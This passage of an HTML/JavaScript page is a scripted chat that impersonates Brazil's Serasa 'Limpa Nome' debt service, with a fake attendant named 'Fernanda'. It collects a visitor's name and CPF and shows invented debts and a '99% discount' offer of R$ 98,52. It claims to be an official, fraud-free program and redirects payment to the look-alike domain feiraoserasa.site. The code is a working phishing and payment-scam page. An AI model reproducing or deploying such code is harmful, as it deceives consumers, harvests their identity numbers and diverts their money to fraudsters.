    content: 'PARABÉNS!',
    subtext: `<div class="success-box">
        <strong>RESUMO DO SEU ACORDO:</strong><br><br>
        • Contrato: 83N2L618362E<br>
        • Beneficiário: Portador do CPF<br>
        • Quitação: Todas as 4 dívidas<br>
        • Valor final: R$ 98,52<br>
        • Desconto: 99%
      </div>`,
    buttons: [
      { text: 'REALIZAR PAGAMENTO DO ACORDO', next: 27, type: 'primary' }
    ]
  },
  {
    id: 27,
    type: 'system',
    content: 'Áudio final',
    media: `<div class="message-media">
      <audio controls autoplay class="media-audio">
        <source src="${mediaUrls.audio5}" type="audio/mpeg">
        Seu navegador não suporta áudio.
      </audio>
      <div class="audio-timer"></div>
    </div>`,
    audioStep: true,
    audioFile: 'audio5'
  },
  {
    id: 28,
    type: 'atendente',
    sender: 'Fernanda - Especialista Serasa',
    content: 'Para finalizar e limpar seu nome imediatamente, clique abaixo:',
    subtext: 'Você será redirecionado para uma página de pagamento 100% segura do Serasa.',
    buttons: [
      { 
        text: 'PAGAR E LIMPAR MEU NOME AGORA', 
        next: 29, 
        type: 'success',
        redirectUrl: 'https://pay.feiraoserasa.site/lDW0ZaJnv64GN7E'
      }
    ]
  },
  {
    id: 29,
    type: 'system',
    content: 'Redirecionando para página segura de pagamento...',
    isFinal: true
  }
];

let currentStep = 0;
let dataFromURLProcessed = false;

// Processar cada passo do fluxo
async function processStep(stepId) {
  const step = flow.find(s => s.id === stepId);
  if (!step) return;
  
  currentStep = stepId;
  
  // Limpa indicadores de digitação anteriores
  document.querySelectorAll('.typing-indicator').forEach(el => el.remove());
  
  if (step.type === 'system') {
    // Mostra indicador de digitação antes da mensagem do sistema
    const typingIndicator = showTypingIndicator('Sistema');
    await new Promise(resolve => setTimeout(resolve, 800));
    typingIndicator.remove();
    
    let content = step.content;
    let media = step.media || '';
    
    // PASSO 5: Adiciona dados se tiver
    if (stepId === 5 && userName && userCPF) {
      content = `Dados de ${userName} validados com sucesso!`;
    }
    
    addMessage(content, 'system', '', media);
    
    // Se for um passo de áudio, aguardar a duração do áudio antes de prosseguir
    if (step.audioStep) {
      const audioDuration = audioDurations[step.audioFile] || 5;
      
      setTimeout(() => {
        processStep(stepId + 1);
      }, (audioDuration * 1000) + 500);
    }
    else if (step.autoNext && !step.isFinal) {
      setTimeout(() => processStep(stepId + 1), 1500);
    } else if (step.buttons) {
      setTimeout(() => showButtons(step.buttons), 500);
    } else if (step.action === 'input_data') {
      setTimeout(() => showDataInput(), 500);
    }
    
  } else if (step.type === 'bot' || step.type === 'atendente') {
    // Mostra indicador de digitação
    const typingIndicator = showTypingIndicator(step.sender);
    await new Promise(resolve => setTimeout(resolve, 800));
    typingIndicator.remove();
    
    let content = step.content;
    let subtext = step.subtext || '';
    let media = step.media || '';
    
    // PASSO 6: Saudação com nome
    if (stepId === 6 && userName) {
      content = `Olá ${userName}! Eu sou a Fernanda, sua atendente especialista.`;
    }
    
    // PASSO 7: Mostra os dados na confirmação
    if (stepId === 7 && userName && userCPF) {
      subtext = `<div class="highlight-box">
          <strong>Nome informado:</strong>
          <div class="masked-data">${userName}</div>
          <strong>CPF informado:</strong>
          <div class="masked-data">${maskCPF(userCPF)}</div>
          <p style="margin-top: 6px; font-size: 0.85rem;">Estas informações estão corretas?</p>
        </div>`;
    }
    
    // PASSO 12: Saudação personalizada
    if (stepId === 12 && userName) {
      content = `Perfeito, ${userName}!`;
    }
    
    // PASSO 19: Situação cadastral
    if (stepId === 19 && userCPF) {
      content = `${userName ? userName + ', sua ' : 'Sua '}situação cadastral:`;
      if (userName) {
        subtext = `${userName}, identificamos 4 dívidas ativas no sistema do portador do CPF ${maskCPF(userCPF)}.<br>Valores entre R$ 1.928,74 e R$ 7.878,23.<br><br>Status: NEGATIVADO<br>Score: Muito baixo (alto risco)`;
      } else {
        subtext = `Identificamos 4 dívidas ativas no sistema do portador do CPF ${maskCPF(userCPF)}.<br>Valores entre R$ 1.928,74 e R$ 7.878,23.<br><br>Status: NEGATIVADO<br>Score: Muito baixo (alto risco)`;
      }
    }
    
    // PASSO 23: Oferta exclusiva
    if (stepId === 23 && userName) {
      subtext = `<div class="success-box">
          <strong>OFERTA EXCLUSIVA para você, ${userName}:</strong><br><br>
          • 99% DE DESCONTO<br>
          • Quitação de TODAS as 4 dívidas<br>
          • Aumento para 890 pontos no score<br>
          • Limpeza imediata do nome<br><br>
          <strong style="font-size: 1rem;">VALOR TOTAL: R$ 98,52</strong>
        </div>`;
    }
    
    // PASSO 26: Parabéns com dados
    if (stepId === 26 && userName) {
      content = `PARABÉNS, ${userName}!`;
      subtext = `<div class="success-box">
          <strong>RESUMO DO SEU ACORDO:</strong><br><br>
          • Contrato: 83N2L618362E<br>
          • Beneficiário: ${userName} (Portador do CPF ${maskCPF(userCPF)})<br>
          • Quitação: Todas as 4 dívidas<br>
          • Valor final: R$ 98,52<br>
          • Desconto: 99%
        </div>`;
    }
    
    // Criar mensagem completa
    const messagesContainer = document.getElementById('messages');
    const messageDiv = document.createElement('div');
    messageDiv.className = `message ${step.type}-message`;
    
    const isAtendente = step.type === 'atendente';
    const header = `
      <div class="message-header">
        <div class="message-avatar ${isAtendente ? 'atendente-avatar' : 'bot-avatar'}">
          ${isAtendente ? 
            '<img src="https://i.pravatar.cc/150?img=32" class="avatar-img" alt="Atendente">' : 
            '<i class="fas fa-robot"></i>'}
        </div>
        <span>${step.sender}</span>
      </div>
    `;
    
    const timestamp = new Date().toLocaleTimeString('pt-BR', {hour: '2-digit', minute:'2-digit'});
    
    messageDiv.innerHTML = `
      ${header}
      <div class="message-content">${content}</div>
      ${subtext ? `<div class="message-subcontent">${subtext}</div>` : ''}
      ${media}
      <div class="message-time">${timestamp}</div>
    `;
    
    messagesContainer.appendChild(messageDiv);
    scrollToBottom();
    
    if (step.buttons) {
      setTimeout(() => showButtons(step.buttons), 500);
    } else if (step.action === 'input_data') {
      setTimeout(() => showDataInput(), 300);
    } else if (step.autoNext || step.delay) {
      setTimeout(() => processStep(stepId + 1), 1500);
    }
  }
  
  if (step.isFinal) {
    setTimeout(() => {
      addMessage('Obrigado por escolher o Serasa Limpa Nome!', 'system');
    }, 1500);
  }
}

// Função para verificar dados da URL e iniciar o fluxo
function startFlowBasedOnData() {
  // Verifica se tem dados na URL
  if (urlData.cpf && urlData.nome) {
    // Valida os dados da URL
    const validacaoNome = validaNome(urlData.nome);
    const cpfValido = validaCPF(urlData.cpf);
    
    if (validacaoNome.valido && cpfValido) {
      // Dados da URL são válidos - usar diretamente
      dataFromURLProcessed = true;
      
      setTimeout(() => {
        addMessage('Bem-vindo ao canal oficial Serasa Limpa Nome!', 'bot', 'Bot Serasa', `
          <div class="logos-container">
            <img src="${mediaUrls.logoGovSer}" alt="GovernoSerasa" class="logo-img">
          </div>
        `);
        
        setTimeout(() => {
          addMessage('Feirão Serasa Limpa Nome - Programa oficial sem fraudes', 'bot', 'Bot Serasa');
          
          setTimeout(() => {
            // Usar os dados validados da URL
            validateData({ nome: urlData.nome, cpf: urlData.cpf });
          }, 1500);
        }, 1500);
      }, 800);
      
    } else {
      // Dados da URL são inválidos - mostrar mensagem de erro e pedir novamente
      dataFromURLProcessed = true;
      
      setTimeout(() => {
        addMessage('Bem-vindo ao canal oficial Serasa Limpa Nome!', 'bot', 'Bot Serasa', `
          <div class="logos-container">
            <img src="${mediaUrls.logoGovSer}" alt="GovernoSerasa" class="logo-img">
          </div>
        `);
        
        setTimeout(() => {
          addMessage('Feirão Serasa Limpa Nome - Programa oficial sem fraudes', 'bot', 'Bot Serasa');
          
          setTimeout(() => {
            const typingIndicator = showTypingIndicator('Bot Serasa');
            
            setTimeout(() => {
              typingIndicator.remove();
              addMessage('Os dados recebidos não são válidos. Por favor, insira seu nome completo e CPF novamente:', 'bot', 'Bot Serasa');
              
              setTimeout(() => {
                showDataInput();
              }, 800);
            }, 800);
          }, 1500);
        }, 1500);
      }, 800);
    }
    
  } else {
    // Não tem dados na URL - iniciar fluxo normal
    setTimeout(() => processStep(1), 800);
  }
}

// Inicializar chat
setTimeout(() => startFlowBasedOnData(), 500);
</script>
</body>
</html>